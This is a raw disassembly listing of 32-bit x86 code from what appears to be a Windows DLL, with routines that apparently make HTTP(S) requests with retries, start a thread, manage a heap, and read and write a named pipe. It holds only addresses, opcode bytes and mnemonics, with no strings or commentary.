10006549:	75 ce                	jne    0x10006519
1000654b:	eb 09                	jmp    0x10006556
1000654d:	c7 45 ec 4f 05 00 00 	movl   $0x54f,-0x14(%ebp)
10006554:	33 f6                	xor    %esi,%esi
10006556:	ff 75 f4             	pushl  -0xc(%ebp)
10006559:	e8 b5 04 00 00       	call   0x10006a13
1000655e:	59                   	pop    %ecx
1000655f:	56                   	push   %esi
10006560:	8d 45 e8             	lea    -0x18(%ebp),%eax
10006563:	50                   	push   %eax
10006564:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
1000656a:	50                   	push   %eax
1000656b:	6a 13                	push   $0x13
1000656d:	ff 75 fc             	pushl  -0x4(%ebp)
10006570:	c7 45 e8 00 01 00 00 	movl   $0x100,-0x18(%ebp)
10006577:	ff 15 e4 e1 00 10    	call   *0x1000e1e4
1000657d:	85 c0                	test   %eax,%eax
1000657f:	74 13                	je     0x10006594
10006581:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10006587:	50                   	push   %eax
10006588:	ff 15 94 e1 00 10    	call   *0x1000e194
1000658e:	89 83 54 01 00 00    	mov    %eax,0x154(%ebx)
10006594:	ff 75 fc             	pushl  -0x4(%ebp)
10006597:	ff 15 0c e2 00 10    	call   *0x1000e20c
1000659d:	8b 45 ec             	mov    -0x14(%ebp),%eax
100065a0:	5f                   	pop    %edi
100065a1:	5e                   	pop    %esi
100065a2:	c9                   	leave  
100065a3:	c3                   	ret    
100065a4:	55                   	push   %ebp
100065a5:	8b ec                	mov    %esp,%ebp
100065a7:	83 ec 0c             	sub    $0xc,%esp
100065aa:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100065ae:	53                   	push   %ebx
100065af:	56                   	push   %esi
100065b0:	57                   	push   %edi
100065b1:	ff 75 08             	pushl  0x8(%ebp)
100065b4:	8b 3d 34 e1 00 10    	mov    0x1000e134,%edi
100065ba:	ff d7                	call   *%edi
100065bc:	83 f8 0a             	cmp    $0xa,%eax
100065bf:	7d 07                	jge    0x100065c8
100065c1:	33 c0                	xor    %eax,%eax
100065c3:	e9 a6 00 00 00       	jmp    0x1000666e
100065c8:	8d 58 01             	lea    0x1(%eax),%ebx
100065cb:	53                   	push   %ebx
100065cc:	e8 13 04 00 00       	call   0x100069e4
100065d1:	8b f0                	mov    %eax,%esi
100065d3:	59                   	pop    %ecx
100065d4:	85 f6                	test   %esi,%esi
100065d6:	0f 84 8f 00 00 00    	je     0x1000666b
100065dc:	53                   	push   %ebx
100065dd:	6a 00                	push   $0x0
100065df:	56                   	push   %esi
100065e0:	e8 45 77 00 00       	call   0x1000dd2a
100065e5:	8b 45 08             	mov    0x8(%ebp),%eax
100065e8:	83 c4 0c             	add    $0xc,%esp
100065eb:	e8 83 ee ff ff       	call   0x10005473
100065f0:	8b d8                	mov    %eax,%ebx
100065f2:	68 48 ea 00 10       	push   $0x1000ea48
100065f7:	53                   	push   %ebx
100065f8:	ff 15 8c e1 00 10    	call   *0x1000e18c
100065fe:	89 45 f8             	mov    %eax,-0x8(%ebp)
10006601:	85 c0                	test   %eax,%eax
10006603:	74 5f                	je     0x10006664
10006605:	2b c3                	sub    %ebx,%eax
10006607:	50                   	push   %eax
10006608:	53                   	push   %ebx
10006609:	56                   	push   %esi
1000660a:	e8 01 77 00 00       	call   0x1000dd10
1000660f:	6a 50                	push   $0x50
10006611:	8b c6                	mov    %esi,%eax
10006613:	e8 88 ee ff ff       	call   0x100054a0
10006618:	0f b7 c0             	movzwl %ax,%eax
1000661b:	83 c4 10             	add    $0x10,%esp
1000661e:	89 45 f4             	mov    %eax,-0xc(%ebp)
10006621:	e8 35 ee ff ff       	call   0x1000545b
10006626:	53                   	push   %ebx
10006627:	ff d7                	call   *%edi
10006629:	8b f8                	mov    %eax,%edi
1000662b:	6b ff 0a             	imul   $0xa,%edi,%edi
1000662e:	57                   	push   %edi
1000662f:	e8 b0 03 00 00       	call   0x100069e4
10006634:	8b d8                	mov    %eax,%ebx
10006636:	59                   	pop    %ecx
10006637:	85 db                	test   %ebx,%ebx
10006639:	74 29                	je     0x10006664
1000663b:	ff 75 f8             	pushl  -0x8(%ebp)
1000663e:	8b cb                	mov    %ebx,%ecx
10006640:	57                   	push   %edi
10006641:	e8 a6 c7 ff ff       	call   0x10002dec
10006646:	6a 05                	push   $0x5
10006648:	ff 75 10             	pushl  0x10(%ebp)
1000664b:	ff 75 0c             	pushl  0xc(%ebp)
1000664e:	53                   	push   %ebx
1000664f:	ff 75 f4             	pushl  -0xc(%ebp)
10006652:	56                   	push   %esi
10006653:	e8 1b 00 00 00       	call   0x10006673
10006658:	53                   	push   %ebx
10006659:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000665c:	e8 b2 03 00 00       	call   0x10006a13
10006661:	83 c4 1c             	add    $0x1c,%esp
10006664:	56                   	push   %esi
10006665:	e8 a9 03 00 00       	call   0x10006a13
1000666a:	59                   	pop    %ecx
1000666b:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000666e:	5f                   	pop    %edi
1000666f:	5e                   	pop    %esi
10006670:	5b                   	pop    %ebx
10006671:	c9                   	leave  
10006672:	c3                   	ret    
10006673:	55                   	push   %ebp
10006674:	8b ec                	mov    %esp,%ebp
10006676:	83 e4 f8             	and    $0xfffffff8,%esp
10006679:	81 ec 58 01 00 00    	sub    $0x158,%esp
1000667f:	56                   	push   %esi
10006680:	57                   	push   %edi
10006681:	33 ff                	xor    %edi,%edi
10006683:	57                   	push   %edi
10006684:	ff 75 10             	pushl  0x10(%ebp)
10006687:	8d 44 24 10          	lea    0x10(%esp),%eax
1000668b:	ff 75 0c             	pushl  0xc(%ebp)
1000668e:	ff 75 08             	pushl  0x8(%ebp)
10006691:	e8 95 f7 ff ff       	call   0x10005e2b
10006696:	8d 44 24 08          	lea    0x8(%esp),%eax
1000669a:	e8 ef 1e 00 00       	call   0x1000858e
1000669f:	85 c0                	test   %eax,%eax
100066a1:	74 60                	je     0x10006703
100066a3:	8b 45 1c             	mov    0x1c(%ebp),%eax
100066a6:	8d 4c 24 08          	lea    0x8(%esp),%ecx
100066aa:	e8 f5 02 00 00       	call   0x100069a4
100066af:	85 c0                	test   %eax,%eax
100066b1:	74 50                	je     0x10006703
100066b3:	8d 44 24 08          	lea    0x8(%esp),%eax
100066b7:	e8 71 fc ff ff       	call   0x1000632d
100066bc:	85 c0                	test   %eax,%eax
100066be:	74 43                	je     0x10006703
100066c0:	8d 44 24 08          	lea    0x8(%esp),%eax
100066c4:	e8 7b fc ff ff       	call   0x10006344
100066c9:	3d c8 00 00 00       	cmp    $0xc8,%eax
100066ce:	75 33                	jne    0x10006703
100066d0:	8d 44 24 08          	lea    0x8(%esp),%eax
100066d4:	e8 40 fc ff ff       	call   0x10006319
100066d9:	3b c7                	cmp    %edi,%eax
100066db:	74 26                	je     0x10006703
100066dd:	39 45 18             	cmp    %eax,0x18(%ebp)
100066e0:	72 21                	jb     0x10006703
100066e2:	50                   	push   %eax
100066e3:	8d 44 24 0c          	lea    0xc(%esp),%eax
100066e7:	e8 37 fc ff ff       	call   0x10006323
100066ec:	50                   	push   %eax
100066ed:	ff 75 14             	pushl  0x14(%ebp)
100066f0:	e8 1b 76 00 00       	call   0x1000dd10
100066f5:	83 c4 0c             	add    $0xc,%esp
100066f8:	8d 44 24 08          	lea    0x8(%esp),%eax
100066fc:	e8 18 fc ff ff       	call   0x10006319
10006701:	8b f8                	mov    %eax,%edi
10006703:	8d 74 24 08          	lea    0x8(%esp),%esi
10006707:	e8 54 fa ff ff       	call   0x10006160
1000670c:	8b c7                	mov    %edi,%eax
1000670e:	5f                   	pop    %edi
1000670f:	5e                   	pop    %esi
10006710:	8b e5                	mov    %ebp,%esp
10006712:	5d                   	pop    %ebp
10006713:	c3                   	ret    
10006714:	55                   	push   %ebp
10006715:	8b ec                	mov    %esp,%ebp
10006717:	81 ec 18 01 00 00    	sub    $0x118,%esp
1000671d:	56                   	push   %esi
1000671e:	57                   	push   %edi
1000671f:	33 ff                	xor    %edi,%edi
10006721:	8b f3                	mov    %ebx,%esi
10006723:	89 bb 54 01 00 00    	mov    %edi,0x154(%ebx)
10006729:	e8 1d fc ff ff       	call   0x1000634b
1000672e:	85 c0                	test   %eax,%eax
10006730:	75 0b                	jne    0x1000673d
10006732:	ff 15 4c e1 00 10    	call   *0x1000e14c
10006738:	e9 4e 01 00 00       	jmp    0x1000688b
1000673d:	0f b7 83 8c 00 00 00 	movzwl 0x8c(%ebx),%eax
10006744:	b9 bb 01 00 00       	mov    $0x1bb,%ecx
10006749:	89 7d ec             	mov    %edi,-0x14(%ebp)
1000674c:	be 00 00 00 04       	mov    $0x4000000,%esi
10006751:	66 3b c1             	cmp    %cx,%ax
10006754:	74 14                	je     0x1000676a
10006756:	b9 5b 11 00 00       	mov    $0x115b,%ecx
1000675b:	66 3b c1             	cmp    %cx,%ax
1000675e:	74 0a                	je     0x1000676a
10006760:	b9 bc 01 00 00       	mov    $0x1bc,%ecx
10006765:	66 3b c1             	cmp    %cx,%ax
10006768:	75 05                	jne    0x1000676f
1000676a:	be 00 30 80 04       	mov    $0x4803000,%esi
1000676f:	57                   	push   %edi
10006770:	56                   	push   %esi
10006771:	57                   	push   %edi
10006772:	57                   	push   %edi
10006773:	57                   	push   %edi
10006774:	ff b3 9c 00 00 00    	pushl  0x9c(%ebx)
1000677a:	68 4c ea 00 10       	push   $0x1000ea4c
1000677f:	ff 73 08             	pushl  0x8(%ebx)
10006782:	ff 15 00 e2 00 10    	call   *0x1000e200
10006788:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000678b:	3b c7                	cmp    %edi,%eax
1000678d:	74 a3                	je     0x10006732
1000678f:	f7 c6 00 00 80 00    	test   $0x800000,%esi
10006795:	74 07                	je     0x1000679e
10006797:	50                   	push   %eax
10006798:	e8 12 f8 ff ff       	call   0x10005faf
1000679d:	59                   	pop    %ecx
1000679e:	57                   	push   %edi
1000679f:	57                   	push   %edi
100067a0:	57                   	push   %edi
100067a1:	57                   	push   %edi
100067a2:	ff 75 fc             	pushl  -0x4(%ebp)
100067a5:	ff 15 1c e2 00 10    	call   *0x1000e21c
100067ab:	85 c0                	test   %eax,%eax
100067ad:	75 18                	jne    0x100067c7
100067af:	ff 15 4c e1 00 10    	call   *0x1000e14c
100067b5:	ff 75 fc             	pushl  -0x4(%ebp)
100067b8:	8b f0                	mov    %eax,%esi
100067ba:	ff 15 0c e2 00 10    	call   *0x1000e20c
100067c0:	8b c6                	mov    %esi,%eax
100067c2:	e9 c4 00 00 00       	jmp    0x1000688b
100067c7:	57                   	push   %edi
100067c8:	57                   	push   %edi
100067c9:	8d 45 f4             	lea    -0xc(%ebp),%eax
100067cc:	50                   	push   %eax
100067cd:	ff 75 fc             	pushl  -0x4(%ebp)
100067d0:	89 7d f4             	mov    %edi,-0xc(%ebp)
100067d3:	ff 15 f4 e1 00 10    	call   *0x1000e1f4
100067d9:	85 c0                	test   %eax,%eax
100067db:	74 6d                	je     0x1000684a
100067dd:	ff 75 f4             	pushl  -0xc(%ebp)
100067e0:	e8 ff 01 00 00       	call   0x100069e4
100067e5:	59                   	pop    %ecx
100067e6:	89 45 f0             	mov    %eax,-0x10(%ebp)
100067e9:	3b c7                	cmp    %edi,%eax
100067eb:	74 5d                	je     0x1000684a
100067ed:	8d 4d f8             	lea    -0x8(%ebp),%ecx
100067f0:	51                   	push   %ecx
100067f1:	ff 75 f4             	pushl  -0xc(%ebp)
100067f4:	89 7d f8             	mov    %edi,-0x8(%ebp)
100067f7:	50                   	push   %eax
100067f8:	ff 75 fc             	pushl  -0x4(%ebp)
100067fb:	ff 15 f0 e1 00 10    	call   *0x1000e1f0
10006801:	eb 2f                	jmp    0x10006832
10006803:	39 7d f8             	cmp    %edi,-0x8(%ebp)
10006806:	74 39                	je     0x10006841
10006808:	ff 75 f0             	pushl  -0x10(%ebp)
1000680b:	8b 7d f8             	mov    -0x8(%ebp),%edi
1000680e:	8d b3 44 01 00 00    	lea    0x144(%ebx),%esi
10006814:	e8 bd f3 ff ff       	call   0x10005bd6
10006819:	85 c0                	test   %eax,%eax
1000681b:	74 1b                	je     0x10006838
1000681d:	8d 45 f8             	lea    -0x8(%ebp),%eax
10006820:	50                   	push   %eax
10006821:	ff 75 f4             	pushl  -0xc(%ebp)
10006824:	ff 75 f0             	pushl  -0x10(%ebp)
10006827:	ff 75 fc             	pushl  -0x4(%ebp)
1000682a:	ff 15 f0 e1 00 10    	call   *0x1000e1f0
10006830:	33 ff                	xor    %edi,%edi
10006832:	85 c0                	test   %eax,%eax
10006834:	75 cd                	jne    0x10006803
10006836:	eb 09                	jmp    0x10006841
10006838:	c7 45 ec 4f 05 00 00 	movl   $0x54f,-0x14(%ebp)
1000683f:	33 ff                	xor    %edi,%edi
10006841:	ff 75 f0             	pushl  -0x10(%ebp)
10006844:	e8 ca 01 00 00       	call   0x10006a13
10006849:	59                   	pop    %ecx
1000684a:	57                   	push   %edi
1000684b:	8d 45 e8             	lea    -0x18(%ebp),%eax
1000684e:	50                   	push   %eax
1000684f:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10006855:	50                   	push   %eax
10006856:	6a 13                	push   $0x13
10006858:	ff 75 fc             	pushl  -0x4(%ebp)
1000685b:	c7 45 e8 00 01 00 00 	movl   $0x100,-0x18(%ebp)
10006862:	ff 15 e4 e1 00 10    	call   *0x1000e1e4
10006868:	85 c0                	test   %eax,%eax
1000686a:	74 13                	je     0x1000687f
1000686c:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10006872:	50                   	push   %eax
10006873:	ff 15 94 e1 00 10    	call   *0x1000e194
10006879:	89 83 54 01 00 00    	mov    %eax,0x154(%ebx)
1000687f:	ff 75 fc             	pushl  -0x4(%ebp)
10006882:	ff 15 0c e2 00 10    	call   *0x1000e20c
10006888:	8b 45 ec             	mov    -0x14(%ebp),%eax
1000688b:	5f                   	pop    %edi
1000688c:	5e                   	pop    %esi
1000688d:	c9                   	leave  
1000688e:	c3                   	ret    
1000688f:	53                   	push   %ebx
10006890:	8b d8                	mov    %eax,%ebx
10006892:	83 bb 3c 01 00 00 00 	cmpl   $0x0,0x13c(%ebx)
10006899:	74 07                	je     0x100068a2
1000689b:	e8 27 fb ff ff       	call   0x100063c7
100068a0:	5b                   	pop    %ebx
100068a1:	c3                   	ret    
100068a2:	e8 6d fe ff ff       	call   0x10006714
100068a7:	5b                   	pop    %ebx
100068a8:	c3                   	ret    
100068a9:	55                   	push   %ebp
100068aa:	8b ec                	mov    %esp,%ebp
100068ac:	53                   	push   %ebx
100068ad:	56                   	push   %esi
100068ae:	8b 75 08             	mov    0x8(%ebp),%esi
100068b1:	57                   	push   %edi
100068b2:	8b c6                	mov    %esi,%eax
100068b4:	e8 d6 ff ff ff       	call   0x1000688f
100068b9:	33 ff                	xor    %edi,%edi
100068bb:	33 db                	xor    %ebx,%ebx
100068bd:	89 45 08             	mov    %eax,0x8(%ebp)
100068c0:	39 be 40 01 00 00    	cmp    %edi,0x140(%esi)
100068c6:	7e 42                	jle    0x1000690a
100068c8:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
100068cc:	74 3c                	je     0x1000690a
100068ce:	8b c6                	mov    %esi,%eax
100068d0:	e8 6f fa ff ff       	call   0x10006344
100068d5:	3d f4 01 00 00       	cmp    $0x1f4,%eax
100068da:	7d 0e                	jge    0x100068ea
100068dc:	8b c6                	mov    %esi,%eax
100068de:	e8 61 fa ff ff       	call   0x10006344
100068e3:	3d 90 01 00 00       	cmp    $0x190,%eax
100068e8:	75 20                	jne    0x1000690a
100068ea:	53                   	push   %ebx
100068eb:	ff 15 44 e1 00 10    	call   *0x1000e144
100068f1:	8b c6                	mov    %esi,%eax
100068f3:	e8 97 ff ff ff       	call   0x1000688f
100068f8:	47                   	inc    %edi
100068f9:	81 c3 98 3a 00 00    	add    $0x3a98,%ebx
100068ff:	89 45 08             	mov    %eax,0x8(%ebp)
10006902:	3b be 40 01 00 00    	cmp    0x140(%esi),%edi
10006908:	7c be                	jl     0x100068c8
1000690a:	8b 86 28 01 00 00    	mov    0x128(%esi),%eax
10006910:	85 c0                	test   %eax,%eax
10006912:	74 0f                	je     0x10006923
10006914:	ff b6 2c 01 00 00    	pushl  0x12c(%esi)
1000691a:	ff 75 08             	pushl  0x8(%ebp)
1000691d:	56                   	push   %esi
1000691e:	ff d0                	call   *%eax
10006920:	83 c4 0c             	add    $0xc,%esp
10006923:	ff b6 34 01 00 00    	pushl  0x134(%esi)
10006929:	8b 3d 3c e1 00 10    	mov    0x1000e13c,%edi
1000692f:	ff d7                	call   *%edi
10006931:	83 be 24 01 00 00 00 	cmpl   $0x0,0x124(%esi)
10006938:	74 0e                	je     0x10006948
1000693a:	e8 21 f8 ff ff       	call   0x10006160
1000693f:	56                   	push   %esi
10006940:	e8 08 13 00 00       	call   0x10007c4d
10006945:	59                   	pop    %ecx
10006946:	eb 08                	jmp    0x10006950
10006948:	ff b6 38 01 00 00    	pushl  0x138(%esi)
1000694e:	ff d7                	call   *%edi
10006950:	8b 45 08             	mov    0x8(%ebp),%eax
10006953:	5f                   	pop    %edi
10006954:	5e                   	pop    %esi
10006955:	5b                   	pop    %ebx
10006956:	5d                   	pop    %ebp
10006957:	c2 04 00             	ret    $0x4
1000695a:	55                   	push   %ebp
1000695b:	8b ec                	mov    %esp,%ebp
1000695d:	51                   	push   %ecx
1000695e:	57                   	push   %edi
1000695f:	89 86 40 01 00 00    	mov    %eax,0x140(%esi)
10006965:	33 ff                	xor    %edi,%edi
10006967:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000696a:	50                   	push   %eax
1000696b:	57                   	push   %edi
1000696c:	56                   	push   %esi
1000696d:	68 a9 68 00 10       	push   $0x100068a9
10006972:	57                   	push   %edi
10006973:	57                   	push   %edi
10006974:	89 7d fc             	mov    %edi,-0x4(%ebp)
10006977:	ff 15 54 e1 00 10    	call   *0x1000e154
1000697d:	89 86 30 01 00 00    	mov    %eax,0x130(%esi)
10006983:	3b c7                	cmp    %edi,%eax
10006985:	74 01                	je     0x10006988
10006987:	47                   	inc    %edi
10006988:	8b c7                	mov    %edi,%eax
1000698a:	5f                   	pop    %edi
1000698b:	c9                   	leave  
1000698c:	c3                   	ret    
1000698d:	56                   	push   %esi
1000698e:	8b f0                	mov    %eax,%esi
10006990:	6a 05                	push   $0x5
10006992:	58                   	pop    %eax
10006993:	c7 86 3c 01 00 00 01 	movl   $0x1,0x13c(%esi)
1000699a:	00 00 00 
1000699d:	e8 b8 ff ff ff       	call   0x1000695a
100069a2:	5e                   	pop    %esi
100069a3:	c3                   	ret    
100069a4:	56                   	push   %esi
100069a5:	8b f1                	mov    %ecx,%esi
100069a7:	83 a6 3c 01 00 00 00 	andl   $0x0,0x13c(%esi)
100069ae:	e8 a7 ff ff ff       	call   0x1000695a
100069b3:	5e                   	pop    %esi
100069b4:	c3                   	ret    
100069b5:	83 3d 70 38 01 10 00 	cmpl   $0x0,0x10013870
100069bc:	75 1c                	jne    0x100069da
100069be:	6a 00                	push   $0x0
100069c0:	68 00 00 40 00       	push   $0x400000
100069c5:	68 00 00 04 00       	push   $0x40000
100069ca:	ff 15 b0 e0 00 10    	call   *0x1000e0b0
100069d0:	a3 70 38 01 10       	mov    %eax,0x10013870
100069d5:	85 c0                	test   %eax,%eax
100069d7:	75 01                	jne    0x100069da
100069d9:	c3                   	ret    
100069da:	ff 05 74 38 01 10    	incl   0x10013874
100069e0:	33 c0                	xor    %eax,%eax
100069e2:	40                   	inc    %eax
100069e3:	c3                   	ret    
100069e4:	55                   	push   %ebp
100069e5:	8b ec                	mov    %esp,%ebp
100069e7:	ff 75 08             	pushl  0x8(%ebp)
100069ea:	6a 08                	push   $0x8
100069ec:	ff 35 70 38 01 10    	pushl  0x10013870
100069f2:	ff 15 a4 e0 00 10    	call   *0x1000e0a4
100069f8:	5d                   	pop    %ebp
100069f9:	c3                   	ret    
100069fa:	55                   	push   %ebp
100069fb:	8b ec                	mov    %esp,%ebp
100069fd:	ff 75 0c             	pushl  0xc(%ebp)
10006a00:	ff 75 08             	pushl  0x8(%ebp)
10006a03:	6a 08                	push   $0x8
10006a05:	ff 35 70 38 01 10    	pushl  0x10013870
10006a0b:	ff 15 a0 e0 00 10    	call   *0x1000e0a0
10006a11:	5d                   	pop    %ebp
10006a12:	c3                   	ret    
10006a13:	55                   	push   %ebp
10006a14:	8b ec                	mov    %esp,%ebp
10006a16:	ff 75 08             	pushl  0x8(%ebp)
10006a19:	6a 00                	push   $0x0
10006a1b:	ff 35 70 38 01 10    	pushl  0x10013870
10006a21:	ff 15 a8 e0 00 10    	call   *0x1000e0a8
10006a27:	5d                   	pop    %ebp
10006a28:	c3                   	ret    
10006a29:	ff 0d 74 38 01 10    	decl   0x10013874
10006a2f:	75 10                	jne    0x10006a41
10006a31:	a1 70 38 01 10       	mov    0x10013870,%eax
10006a36:	85 c0                	test   %eax,%eax
10006a38:	74 07                	je     0x10006a41
10006a3a:	50                   	push   %eax
10006a3b:	ff 15 ac e0 00 10    	call   *0x1000e0ac
10006a41:	c3                   	ret    
10006a42:	55                   	push   %ebp
10006a43:	8b ec                	mov    %esp,%ebp
10006a45:	83 ec 18             	sub    $0x18,%esp
10006a48:	53                   	push   %ebx
10006a49:	56                   	push   %esi
10006a4a:	33 f6                	xor    %esi,%esi
10006a4c:	57                   	push   %edi
10006a4d:	8b 3d 44 e1 00 10    	mov    0x1000e144,%edi
10006a53:	89 75 f8             	mov    %esi,-0x8(%ebp)
10006a56:	56                   	push   %esi
10006a57:	56                   	push   %esi
10006a58:	6a 03                	push   $0x3
10006a5a:	56                   	push   %esi
10006a5b:	56                   	push   %esi
10006a5c:	68 00 00 00 c0       	push   $0xc0000000
10006a61:	68 54 eb 00 10       	push   $0x1000eb54
10006a66:	ff 15 70 e0 00 10    	call   *0x1000e070
10006a6c:	8b d8                	mov    %eax,%ebx
10006a6e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10006a71:	83 fb ff             	cmp    $0xffffffff,%ebx
10006a74:	75 11                	jne    0x10006a87
10006a76:	6a 32                	push   $0x32
10006a78:	ff d7                	call   *%edi
10006a7a:	ff 45 f8             	incl   -0x8(%ebp)
10006a7d:	83 7d f8 40          	cmpl   $0x40,-0x8(%ebp)
10006a81:	7c d3                	jl     0x10006a56
10006a83:	33 c0                	xor    %eax,%eax
10006a85:	eb 7d                	jmp    0x10006b04
10006a87:	56                   	push   %esi
10006a88:	8d 45 f0             	lea    -0x10(%ebp),%eax
10006a8b:	50                   	push   %eax
10006a8c:	68 14 01 00 00       	push   $0x114
10006a91:	ff 75 08             	pushl  0x8(%ebp)
10006a94:	89 75 f0             	mov    %esi,-0x10(%ebp)
10006a97:	53                   	push   %ebx
10006a98:	ff 15 84 e0 00 10    	call   *0x1000e084
10006a9e:	85 c0                	test   %eax,%eax
10006aa0:	75 09                	jne    0x10006aab
10006aa2:	53                   	push   %ebx
10006aa3:	ff 15 50 e1 00 10    	call   *0x1000e150
10006aa9:	eb d8                	jmp    0x10006a83
10006aab:	8b 1d 40 e1 00 10    	mov    0x1000e140,%ebx
10006ab1:	89 75 fc             	mov    %esi,-0x4(%ebp)
10006ab4:	89 75 f8             	mov    %esi,-0x8(%ebp)
10006ab7:	ff d3                	call   *%ebx
10006ab9:	89 45 ec             	mov    %eax,-0x14(%ebp)
10006abc:	eb 2e                	jmp    0x10006aec
10006abe:	39 75 f8             	cmp    %esi,-0x8(%ebp)
10006ac1:	75 2e                	jne    0x10006af1
10006ac3:	ff d3                	call   *%ebx
10006ac5:	2b 45 ec             	sub    -0x14(%ebp),%eax
10006ac8:	3d e0 93 04 00       	cmp    $0x493e0,%eax
10006acd:	73 22                	jae    0x10006af1
10006acf:	6a 10                	push   $0x10
10006ad1:	ff d7                	call   *%edi
10006ad3:	56                   	push   %esi
10006ad4:	8d 45 fc             	lea    -0x4(%ebp),%eax
10006ad7:	50                   	push   %eax
10006ad8:	68 00 04 00 00       	push   $0x400
10006add:	ff 75 0c             	pushl  0xc(%ebp)
10006ae0:	ff 75 f4             	pushl  -0xc(%ebp)
10006ae3:	ff 15 74 e0 00 10    	call   *0x1000e074
10006ae9:	89 45 f8             	mov    %eax,-0x8(%ebp)
10006aec:	39 75 fc             	cmp    %esi,-0x4(%ebp)
10006aef:	74 cd                	je     0x10006abe
10006af1:	ff 75 f4             	pushl  -0xc(%ebp)
10006af4:	ff 15 50 e1 00 10    	call   *0x1000e150
10006afa:	8b 45 fc             	mov    -0x4(%ebp),%eax
10006afd:	39 75 f8             	cmp    %esi,-0x8(%ebp)
10006b00:	75 02                	jne    0x10006b04
10006b02:	8b c6                	mov    %esi,%eax
10006b04:	5f                   	pop    %edi
10006b05:	5e                   	pop    %esi
10006b06:	5b                   	pop    %ebx
10006b07:	c9                   	leave  
10006b08:	c3                   	ret    
10006b09:	55                   	push   %ebp
10006b0a:	8b ec                	mov    %esp,%ebp
10006b0c:	83 ec 10             	sub    $0x10,%esp
10006b0f:	53                   	push   %ebx
10006b10:	33 db                	xor    %ebx,%ebx
10006b12:	56                   	push   %esi
10006b13:	8b 75 08             	mov    0x8(%ebp),%esi
10006b16:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006b19:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10006b1c:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10006b1f:	3b f3                	cmp    %ebx,%esi
10006b21:	75 08                	jne    0x10006b2b
10006b23:	6a 57                	push   $0x57
10006b25:	58                   	pop    %eax
10006b26:	e9 d0 00 00 00       	jmp    0x10006bfb
10006b2b:	57                   	push   %edi
10006b2c:	bf 00 00 80 00       	mov    $0x800000,%edi
10006b31:	57                   	push   %edi
10006b32:	e8 ad fe ff ff       	call   0x100069e4
10006b37:	59                   	pop    %ecx
10006b38:	89 45 08             	mov    %eax,0x8(%ebp)
10006b3b:	3b c3                	cmp    %ebx,%eax
10006b3d:	74 17                	je     0x10006b56
10006b3f:	57                   	push   %edi
10006b40:	e8 9f fe ff ff       	call   0x100069e4
10006b45:	59                   	pop    %ecx
10006b46:	89 45 f4             	mov    %eax,-0xc(%ebp)
10006b49:	3b c3                	cmp    %ebx,%eax
10006b4b:	75 60                	jne    0x10006bad
10006b4d:	ff 75 08             	pushl  0x8(%ebp)
10006b50:	e8 be fe ff ff       	call   0x10006a13
10006b55:	59                   	pop    %ecx
10006b56:	ff 15 4c e1 00 10    	call   *0x1000e14c
10006b5c:	e9 99 00 00 00       	jmp    0x10006bfa
10006b61:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
10006b64:	74 5c                	je     0x10006bc2
10006b66:	8b 4e 04             	mov    0x4(%esi),%ecx
10006b69:	8b c1                	mov    %ecx,%eax
10006b6b:	e8 bc 01 00 00       	call   0x10006d2c
10006b70:	8b d0                	mov    %eax,%edx
10006b72:	3b d3                	cmp    %ebx,%edx
10006b74:	74 18                	je     0x10006b8e
10006b76:	53                   	push   %ebx
10006b77:	8b c1                	mov    %ecx,%eax
10006b79:	e8 a9 df ff ff       	call   0x10004b27
10006b7e:	50                   	push   %eax
10006b7f:	57                   	push   %edi
10006b80:	ff 75 f4             	pushl  -0xc(%ebp)
10006b83:	ff 75 fc             	pushl  -0x4(%ebp)
10006b86:	ff 75 08             	pushl  0x8(%ebp)
10006b89:	ff d2                	call   *%edx
10006b8b:	89 45 f8             	mov    %eax,-0x8(%ebp)
10006b8e:	53                   	push   %ebx
10006b8f:	8d 45 f0             	lea    -0x10(%ebp),%eax
10006b92:	50                   	push   %eax
10006b93:	ff 75 f8             	pushl  -0x8(%ebp)
10006b96:	ff 75 f4             	pushl  -0xc(%ebp)
10006b99:	ff 36                	pushl  (%esi)
10006b9b:	ff 15 84 e0 00 10    	call   *0x1000e084
10006ba1:	85 c0                	test   %eax,%eax
10006ba3:	74 1d                	je     0x10006bc2
10006ba5:	8b 45 f8             	mov    -0x8(%ebp),%eax
10006ba8:	3b 45 f0             	cmp    -0x10(%ebp),%eax
10006bab:	75 15                	jne    0x10006bc2
10006bad:	53                   	push   %ebx
10006bae:	8d 45 fc             	lea    -0x4(%ebp),%eax
10006bb1:	50                   	push   %eax
10006bb2:	57                   	push   %edi
10006bb3:	ff 75 08             	pushl  0x8(%ebp)
10006bb6:	ff 36                	pushl  (%esi)
10006bb8:	ff 15 74 e0 00 10    	call   *0x1000e074
10006bbe:	85 c0                	test   %eax,%eax
10006bc0:	75 9f                	jne    0x10006b61
10006bc2:	ff 75 f4             	pushl  -0xc(%ebp)
10006bc5:	e8 49 fe ff ff       	call   0x10006a13
10006bca:	ff 75 08             	pushl  0x8(%ebp)
10006bcd:	e8 41 fe ff ff       	call   0x10006a13
10006bd2:	59                   	pop    %ecx
10006bd3:	59                   	pop    %ecx
10006bd4:	ff 36                	pushl  (%esi)
10006bd6:	ff 15 c0 e0 00 10    	call   *0x1000e0c0
10006bdc:	ff 36                	pushl  (%esi)
10006bde:	ff 15 bc e0 00 10    	call   *0x1000e0bc
10006be4:	ff 36                	pushl  (%esi)
10006be6:	ff 15 50 e1 00 10    	call   *0x1000e150
10006bec:	39 5e 08             	cmp    %ebx,0x8(%esi)
10006bef:	74 07                	je     0x10006bf8
10006bf1:	56                   	push   %esi
10006bf2:	e8 1c fe ff ff       	call   0x10006a13
10006bf7:	59                   	pop    %ecx
10006bf8:	33 c0                	xor    %eax,%eax
10006bfa:	5f                   	pop    %edi
10006bfb:	5e                   	pop    %esi
10006bfc:	5b                   	pop    %ebx
10006bfd:	c9                   	leave  
10006bfe:	c2 04 00             	ret    $0x4
10006c01:	55                   	push   %ebp
10006c02:	8b ec                	mov    %esp,%ebp
